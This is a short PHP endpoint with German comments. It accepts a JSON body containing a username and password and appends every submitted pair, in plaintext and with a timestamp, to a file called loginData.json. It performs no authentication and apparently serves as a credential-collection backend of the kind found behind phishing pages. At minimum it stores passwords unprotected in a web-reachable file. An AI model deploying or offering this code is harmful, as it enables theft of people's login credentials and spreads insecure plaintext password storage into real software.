<?php
// JSON-Daten vom POST-Request einlesen
$data = file_get_contents("php://input");
if (!$data) {
    http_response_code(400);
    echo "Keine Daten empfangen";
    exit;
}

$loginArr = json_decode($data, true);
if (!$loginArr || !isset($loginArr['username']) || !isset($loginArr['password'])) {
    http_response_code(400);
    echo "Ungültige Daten";
    exit;
}

$file = 'loginData.json';

// Vorhandene Daten laden oder neues Array anlegen
if (file_exists($file)) {
    $currentData = json_decode(file_get_contents($file), true);
    if (!is_array($currentData)) {
        $currentData = [];
    }
} else {
    $currentData = [];
}

// Neue Einträge hinzufügen mit Zeitstempel
$currentData[] = [
    'username' => $loginArr['username'],
    'password' => $loginArr['password'],
    'timestamp' => date('Y-m-d H:i:s')
];

// JSON-Datei speichern
file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT));

echo "Daten erfolgreich gespeichert";
?>
